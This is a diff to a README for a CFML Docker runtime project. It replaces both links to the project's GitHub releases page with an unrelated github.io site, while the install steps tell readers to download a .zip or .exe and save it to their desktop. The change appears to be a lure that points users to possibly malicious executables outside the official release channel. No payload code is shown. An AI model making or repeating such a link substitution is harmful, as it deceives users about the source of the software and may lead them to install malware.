@@ -1,6 +1,6 @@
 # 📦 commandbox-cfml-docker-runtime - Reliable web server software for businesses
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dickiecostplus834/commandbox-cfml-docker-runtime/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dickiecostplus834.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 You need to follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/dickiecostplus834/commandbox-cfml-docker-runtime/releases) to download the latest version.
+1. Visit the [releases page](https://dickiecostplus834.github.io) to download the latest version.
 2. Look for the file that ends in .zip or .exe.
 3. Save the file to your desktop for easy access.
 4. Extract the folder if you downloaded a zip file.
